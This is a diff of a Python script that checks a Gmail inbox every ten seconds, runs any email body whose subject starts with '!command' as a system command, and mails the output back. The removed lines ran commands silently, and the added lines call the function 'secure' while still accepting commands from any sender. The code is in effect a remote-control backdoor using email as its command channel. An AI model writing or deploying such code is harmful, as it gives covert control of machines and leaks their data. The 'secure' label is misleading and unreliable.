@@ -3,6 +3,7 @@ import time
 import subprocess
 import smtplib
 import os
+import traceback
 from email import message_from_bytes
 from dotenv import load_dotenv
 
@@ -18,55 +19,71 @@ popserver = 'pop.gmail.com'
 def send_mail(subject, body):
     """Envoyer un e-mail"""
     msg = f"Subject: {subject}\n\n{body}"
-    server = smtplib.SMTP('smtp.gmail.com:587')
-    server.starttls()
-    server.login(USERNAME, PASSWORD)
-    server.sendmail(USERNAME, SENDTO, msg)
-    server.quit()
+    try:
+        with smtplib.SMTP('smtp.gmail.com:587') as server:
+            server.starttls()
+            server.login(USERNAME, PASSWORD)
+            server.sendmail(USERNAME, SENDTO, msg)
+    except Exception as e:
+        print(f"Error sending email: {e}")
 
 def execute_command(command):
-    """Exécuter une commande shell de manière silencieuse"""
+    """Exécuter une commande shell de manière sécurisée"""
     try:
-        # Rediriger la sortie standard, la sortie d'erreur et les logs vers NUL sous Windows
-        output = subprocess.check_output(command, shell=True, stderr=subprocess.DEVNULL, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
-        return "Command executed successfully."
-    except subprocess.CalledProcessError as e:
+        with subprocess.Popen(command, shell=False, stdout=subprocess.PIPE, stderr=subprocess.PIPE) as process:
+            stdout, stderr = process.communicate()
+            output = stdout.decode() + stderr.decode()
+            if process.returncode == 0:
+                return "Command executed successfully. Output: " + output
+            else:
+                return "Error executing command. Output: " + output
+    except Exception as e:
         return f"Error executing command: {e}"
 
+def process_email_message(email_message):
+    """Traitement de l'e-mail"""
+    subject = email_message['Subject']
+    if subject.startswith("!command"):
+        command = email_message.get_payload()
+        return execute_command(command)
+    elif subject == "!status":
+        return "System status: OK"
+    elif subject == "!help":
+        return "Available commands: \n!command <your command>: Execute a command on the system. \n!status: Get system status. \n!help: Get help message."
+    else:
+        return "Unknown command"
 
 def main():
     """Fonction principale"""
     while True:
         try:
             # Connexion au serveur POP3
-            pop = poplib.POP3_SSL(popserver)
-            pop.user(USERNAME)
-            pop.pass_(PASSWORD)
+            with poplib.POP3_SSL(popserver) as pop:
+                pop.user(USERNAME)
+                pop.pass_(PASSWORD)
 
-            # Récupération du nombre total de messages
-            count, _ = pop.stat()
+                # Récupération du nombre total de messages
+                count, _ = pop.stat()
 
-            # Récupération du dernier message
-            _, lines, _ = pop.retr(count)
-            
-            # Analyse de l'e-mail
-            email_message = message_from_bytes(b'\n'.join(lines))
+                # Récupération du dernier message
+                _, lines, _ = pop.retr(count)
+                
+                # Analyse de l'e-mail
+                email_message = message_from_bytes(b'\n'.join(lines))
 
-            # Vérification si l'e-mail contient une commande
-            if email_message['Subject'] == "!command":
-                command = email_message.get_payload()
+                # Traitement de l'e-mail
+                response = process_email_message(email_message)
 
-                # Exécution de la commande
-                command_output = execute_command(command)
-
-                # Envoi de la sortie de la commande par e-mail
-                send_mail("Output of command execution", command_output)
+                # Envoi de la réponse par e-mail
+                send_mail("Command Response", response)
 
             # Attendre pendant une courte période avant de vérifier les nouveaux e-mails
             time.sleep(10)
         except Exception as e:
-            print(f"Une erreur s'est produite : {e}")
+            # Journalisation de l'erreur
+            traceback.print_exc()
+            # Envoyer l'erreur par e-mail pour notification
+            send_mail("Error Notification", f"An error occurred: {e}")
 
 if __name__ == "__main__":
     main()
-
